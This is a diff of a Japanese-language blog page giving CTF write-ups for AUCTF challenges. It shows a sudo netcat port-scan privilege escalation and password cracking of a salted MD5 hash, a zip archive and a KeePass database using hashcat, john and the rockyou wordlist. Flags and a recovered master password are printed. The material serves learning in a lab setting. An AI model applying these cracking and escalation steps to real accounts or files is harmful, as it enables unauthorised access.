@@ -1086,41 +1081,41 @@ auctf{FunKy_P3rm1ssi0nZ}
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -la
-total <span class="m">36</span>
-dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> 21:54 .
-drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
--rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
--rw-r--r-- <span class="m">1</span> level5 level5 <span class="m">3777</span> Apr  <span class="m">4</span> 22:03 .bashrc
--rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
--r--r----- <span class="m">1</span> root   root     <span class="m">23</span> Apr  <span class="m">1</span> 21:25 flag.txt
--r-xr-x--- <span class="m">1</span> root   level5  <span class="m">137</span> Apr  <span class="m">1</span> 21:25 portforce.sh
-
-
-$ cat portforce.sh
-<span class="c1">#!/bin/bash</span>
-
-<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i 1024-65500 -n 1<span class="k">)</span>
-<span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
-<span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
-<span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
-cat flag.txt
-
-
-$ sudo -l
-Matching Defaults entries <span class="k">for</span> level5 on 7fe0b0d86907:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User level5 may run the following commands on 7fe0b0d86907:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/level5/portforce.sh
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">36</span>
+</span></span><span class="line"><span class="cl">dr-xr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">4</span> 21:54 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root   root   <span class="m">4096</span> Apr  <span class="m">3</span> 15:35 ..
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">220</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level5 level5 <span class="m">3777</span> Apr  <span class="m">4</span> 22:03 .bashrc
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> level5 level5  <span class="m">807</span> Apr  <span class="m">4</span>  <span class="m">2018</span> .profile
+</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root   root     <span class="m">23</span> Apr  <span class="m">1</span> 21:25 flag.txt
+</span></span><span class="line"><span class="cl">-r-xr-x--- <span class="m">1</span> root   level5  <span class="m">137</span> Apr  <span class="m">1</span> 21:25 portforce.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ cat portforce.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i 1024-65500 -n 1<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
+</span></span><span class="line"><span class="cl">cat flag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> level5 on 7fe0b0d86907:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User level5 may run the following commands on 7fe0b0d86907:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/level5/portforce.sh
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-これはローカルで試したら、よくわかりやすかったです。</p>
+</div><br />
+これはローカルで試したら、よくわかりやすかったです。
 <p>以下のようなファイルを用意。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1130,22 +1125,22 @@ User level5 may run the following commands on 7fe0b0d86907:
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>
-<span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i 1024-65500 -n 1<span class="k">)</span>
-<span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
-<span class="nb">echo</span> <span class="nv">$x</span>   <span class="c1"># &lt;&lt;&lt;&lt; これを追加</span>
-<span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
-<span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
-cat flag.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">x</span><span class="o">=</span><span class="k">$(</span>shuf -i 1024-65500 -n 1<span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Guess the listening port&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="nv">$x</span>   <span class="c1"># &lt;&lt;&lt;&lt; これを追加</span>
+</span></span><span class="line"><span class="cl"><span class="nv">input</span><span class="o">=</span><span class="k">$(</span>nc -lp <span class="nv">$x</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;That was easy right? :)&#34;</span>
+</span></span><span class="line"><span class="cl">cat flag.txt
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-これで実行すると、どのポートでncがlistenしているかわかるので、（ま、netstatでもよかったけど）</p>
+</div><br />
+これで実行すると、どのポートでncがlistenしているかわかるので、（ま、netstatでもよかったけど）
 <p>そのポートに対して、<code>echo test | nc localhost &lt;port&gt;</code> みたいにしてやると、以降の処理が実行されてフラグが表示されました。</p>
 <p>ちなみに、ローカルでテストする場合は、rootじゃなくても、自分自身でテストはできました。</p>
-<p><br />
-ということで、チャレンジサーバ上で、<code>sudo /home/level5/portforce.sh</code>を実行して待受けしつつ、別のターミナルにて、</p>
+<br />
+ということで、チャレンジサーバ上で、`sudo /home/level5/portforce.sh`を実行して待受けしつつ、別のターミナルにて、
 <pre>
 $ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
 invalid port {1024..65500} : No such file or directory
@@ -1156,8 +1151,8 @@ $ for i in {1024..65500} ; do (echo test | nc localhost ${i}) ; done
 <div class="admonition tip"><p class="admonition-title">Tips</p>
 <p>/bin/sh と /bin/bash でループの書き方が違うので、上記のやり方は/bin/shだとエラーになります。</p>
 </div>
-<p><br />
-Flag: <code>auctf{n3tc@_purt_$can}</code></p>
+<br />
+Flag: `auctf{n3tc@_purt_$can}`
 <p>＃Discordで、「Random portがたまたま2回目で当たった」	と喜んでいる人がいました。たぶん、それはポート番号が当たったんじゃなくて、他の人がncを実行してくれたんだと思います。それはそれでラッキーでしたね^^</p>
 <p><br /><br />
 <br /><br />
@@ -1172,11 +1167,11 @@ Flag: <code>auctf{n3tc@_purt_$can}</code></p>
 <blockquote>
 <p>This site used to look a lot cooler.</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-11">Solution</h3>
 <p>チャレンジ内容から考えて、Web Archiveから過去のページを調べるやつでしたね。</p>
 <p><a href="https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users">https://web.archive.org/web/20200213064621/https://ctf.auburn.edu/users</a></p>
-<p><br /></p>
+<br />
 <p>Flag: <code>auctf{Th053_w3rE_Th3_guD_0l3_d4y5}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1194,13 +1189,13 @@ NOTE: The flag is NOT in the standard auctf{} format
 <br /><br />
 flag format - comma separated list 1, 2, 3, 4, 5</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-12">Solution</h3>
 <p>&lsquo;SeeDa&rsquo; なので Seedを0か何かに決め打ちしてrand()関数を呼んだらシーケンスが見れると思ってCでやろうとしてたんですが、ダメでした（読みは合ってた）。これは、Pythonでやるやつだったみたいです。</p>
 <p>ちなみに、ダメだったやつ：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1219,34 +1214,34 @@ flag format - comma separated list 1, 2, 3, 4, 5</p>
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="cp">#define RAND_MAX 128
-</span><span class="cp"></span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-	<span class="n">srand</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define RAND_MAX 128
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">srand</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d &#34;</span><span class="p">,</span> <span class="nf">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">128</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>ダメな結果：</p>
 <pre>
 103 70 105 115 81 127 74 108 
 </pre>
-<p><br />
-正解：</p>
+<br />
+正解：
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1276,37 +1271,37 @@ flag format - comma separated list 1, 2, 3, 4, 5</p>
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="err">$</span> <span class="n">python3</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">random</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">()</span>
-<span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
-  <span class="n">File</span> <span class="s2">&#34;&lt;stdin&gt;&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
-<span class="ne">TypeError</span><span class="p">:</span> <span class="n">randint</span><span class="p">()</span> <span class="n">missing</span> <span class="mi">2</span> <span class="n">required</span> <span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span> <span class="ow">and</span> <span class="s1">&#39;b&#39;</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">98</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">107</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">10</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">66</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">124</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">103</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">77</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">122</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">91</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
-<span class="mi">55</span>
-<span class="o">&gt;&gt;&gt;</span> <span class="nb">exit</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">python3</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">Traceback</span> <span class="p">(</span><span class="n">most</span> <span class="n">recent</span> <span class="n">call</span> <span class="n">last</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">File</span> <span class="s2">&#34;&lt;stdin&gt;&#34;</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="ow">in</span> <span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="ne">TypeError</span><span class="p">:</span> <span class="n">randint</span><span class="p">()</span> <span class="n">missing</span> <span class="mi">2</span> <span class="n">required</span> <span class="n">positional</span> <span class="n">arguments</span><span class="p">:</span> <span class="s1">&#39;a&#39;</span> <span class="ow">and</span> <span class="s1">&#39;b&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">98</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">107</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">66</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">124</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">103</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">77</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">122</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">91</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">55</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">exit</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br /></p>
+</div><br />
 <p>Flag: <code>103, 77, 122, 91, 55</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1320,12 +1315,12 @@ Hash: 5eaff45e09bec5222a9cfa9502a4740d
 <br /><br />
 NOTE: The flag is NOT in the standard auctf{} format</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-13">Solution</h3>
 <p>最初、以下みたいなサイトで解くやつかと思ったんですよね。</p>
 <p><a href="https://www.dcode.fr/md5-hash">https://www.dcode.fr/md5-hash</a></p>
-<p><br />
-その後、以下のファイルを作るところまではやったんですが、<code>john</code> で解こうとしてハマって終了。</p>
+<br />
+その後、以下のファイルを作るところまではやったんですが、`john` で解こうとしてハマって終了。
 <pre>
 5eaff45e09bec5222a9cfa9502a4740d:1337
 </pre>
@@ -1343,7 +1338,7 @@ $ hashcat --help | grep salt | grep md5
    4110 | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated
    3910 | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated
 </pre>
-<p><br /></p>
+<br />
 <pre>
 $ hashcat -m 20 -a 0 salty.txt /usr/share/wordlists/rockyou.txt --force
 hashcat (v5.1.0) starting...
@@ -1368,7 +1363,7 @@ Restore.Point....: 26624/14344385 (0.19%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
 Candidates.#1....: 200390 -> spongebob9
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>treetop</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1384,7 +1379,7 @@ NOTE: The flag is NOT in the standard auctf{} format</p>
 <ul>
 <li>zippy.zip</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-14">Solution</h3>
 <p>まずは、ダメだった例から。</p>
 <pre>
@@ -1395,7 +1390,7 @@ $ fcrackzip -v -D -u -p /usr/share/wordlists/rockyou.txt zippy.zip
 found file 'unzipme.zip', (size cp/uc    871/   908, flags 1, chk 0000)
 </pre>
 <p>というか、zip2john自体はあってたっぽいけど、なんか失敗してるのかと思って、fcrackzipをやって解けなかったので諦めたやつでした。</p>
-<p><br /></p>
+<br />
 <p>今日 <code>john</code> でやってみたら普通にできたし。（11分かかりました）</p>
 <pre>
 $ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -1408,8 +1403,8 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 </pre>
-<p><br />
-ちなみに、<code>hashcat</code> でもやってみました。（こっちは24分くらいかかりました）</p>
+<br />
+ちなみに、`hashcat` でもやってみました。（こっちは24分くらいかかりました）
 <pre>
 $ hashcat -h | grep -i zip
   11600 | 7-Zip                                            | Archives
@@ -1457,7 +1452,7 @@ NOTE: The flag is NOT in the standard auctf{} format</p>
 <ul>
 <li>manager.kdbx</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-15">Solution</h3>
 <p>いちおう、以下はやったんです。</p>
 <pre>
@@ -1465,8 +1460,8 @@ $ keepass2john manager.kdbx > hash.txt
 $ john --incremental=digits hash.txt 
 </pre>
 <p>でも、1時間半やっても終わらなかったので、強制終了して諦めたやつでした。。。</p>
-<p><br />
-他の方のWriteupとか見てると、3時間くらいかかるっぽいですね。せっかちなんで、そんなに待っていられないです。</p>
+<br />
+他の方のWriteupとか見てると、3時間くらいかかるっぽいですね。せっかちなんで、そんなに待っていられないです。
 <p>あと、もしかしたら、以下のようにフォーマットを指定した方がよかったかもです。</p>
 <pre>
 $ john --format:keepass --incremental=digits hash.txt
@@ -1497,8 +1492,8 @@ Restore.Point....: 37888/100000 (37.89%)
 Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59904-60000
 Candidates.#1....: 168432 -> 176865
 </pre>
-<p><br />
-もしかしたら、<code>-w</code>オプションを付けたらもっと早く終わるのかも知れないですけど、試してないです。</p>
+<br />
+もしかしたら、`-w`オプションを付けたらもっと早く終わるのかも知れないですけど、試してないです。
 <p>以下、helpより。</p>
 <pre>
 - [ Workload Profiles ] -
@@ -1510,8 +1505,8 @@ Candidates.#1....: 168432 -> 176865
   3 | High        |  96 ms  | High              | Unresponsive
   4 | Nightmare   | 480 ms  | Insane            | Headless
 </pre>
-<p><br />
-ここで取れた Master Password (157865) を使って、WindowsのKeePassツールで開くとフラグが取れました。</p>
+<br />
+ここで取れた Master Password (157865) を使って、WindowsのKeePassツールで開くとフラグが取れました。
 <p>Flag: <code>y0u4r34r34lh4ck3rn0w#!$1678</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -1527,11 +1522,11 @@ Standard Flag Format auctf{}</p>
 <ul>
 <li>f451.pcapng</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-16">Solution</h3>
 <p>Pcapから、Fahrenheit_451_Full_Text.pdf を取り出すところまでは、すんなりいけます。</p>
-<p><br />
-PDFは72ページあります。ハイライトもやってみたんですが、ページ数が多くて怪しい箇所を見つけるまでの根気がなくて諦めたやつです。</p>
+<br />
+PDFは72ページあります。ハイライトもやってみたんですが、ページ数が多くて怪しい箇所を見つけるまでの根気がなくて諦めたやつです。
 <p>他の方のWriteupを参照すると、上から眺めていけば8ページ目辺りで見つかったらしいです。</p>
 <p>そんなんだったら、72ページじゃなくて、せめて10ページくらいのファイルにしてくれてもいいのに。。。</p>
 <p><br /><br />
@@ -1540,23 +1535,23 @@ PDFは72ページあります。ハイライトもやってみたんですが、
 <pre>
 $ pdftotext Fahrenheit_451_Full_Text.pdf
 </pre>
-<p><br />
-案1：スペリングがおかしい単語を全部出してみるとか。</p>
+<br />
+案1：スペリングがおかしい単語を全部出してみるとか。
 <pre>
 $ cat Fahrenheit_451_Full_Text.txt | aspell list | sort | uniq
 </pre>
-<p>==&gt; これはダメでした。フラグの箇所がそもそも単語とみなされないため。</p>
-<p><br />
-案2：10文字以上の単語を全部出してみるとか。</p>
+==> これはダメでした。フラグの箇所がそもそも単語とみなされないため。
+<br />
